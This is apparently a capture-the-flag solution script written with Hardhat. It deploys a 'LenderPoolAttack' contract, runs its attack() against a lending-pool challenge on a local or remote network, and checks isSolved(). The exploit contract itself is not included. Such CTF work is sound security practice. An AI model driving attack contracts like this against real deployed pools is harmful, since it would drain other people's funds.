import chalk from "chalk";
import { ethers } from "hardhat";
import { LenderPool__factory, LenderPoolAttack__factory, LenderPoolCheck__factory } from "../../typechain";

function log(s:string){
    console.log(`${chalk.green("[-] ")+s}`)
}


async function main() {
    const signers = await ethers.getSigners();
    const provider = ethers.provider;
    const network = await provider.getNetwork();
    const deployer = signers[0];
    const attacker = signers[2];

    log(`Running on the ${chalk.yellow(network.name)} network`);
    log(`Attacker address: ${chalk.yellow(attacker.address)}`);
    log(`Attacker balance: ${chalk.yellow(ethers.formatEther(await provider.getBalance(attacker)))} ETH`);

    let lenderPoolCheckContract;
    let tx;
    if(network.name == "hardhat") {
        lenderPoolCheckContract = await new LenderPoolCheck__factory(deployer).deploy();
        await lenderPoolCheckContract.waitForDeployment();
        lenderPoolCheckContract = lenderPoolCheckContract.connect(attacker);
        log(`Successfully deployed the target contract to address ${chalk.yellow(await lenderPoolCheckContract.getAddress())}!`)
    } else if (network.name == "remote") {
        const contractAddress = "0x0000000000000000000000000000000000000000";
        lenderPoolCheckContract = LenderPoolCheck__factory.connect(contractAddress, attacker);
        log(`Successfully connected to the target contract with address ${chalk.yellow(await lenderPoolCheckContract.getAddress())}!`)
    }


    if(lenderPoolCheckContract) {
        const lenderPoolAttack = await new LenderPoolAttack__factory(attacker).deploy();
        await lenderPoolAttack.waitForDeployment();
        const lenderPool = await lenderPoolCheckContract.lenderPool();
        tx = await lenderPoolAttack.attack(lenderPool);
        await tx.wait();
        log(`Is solved: ${chalk.yellow(await lenderPoolCheckContract.isSolved())}`);
    
    }
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});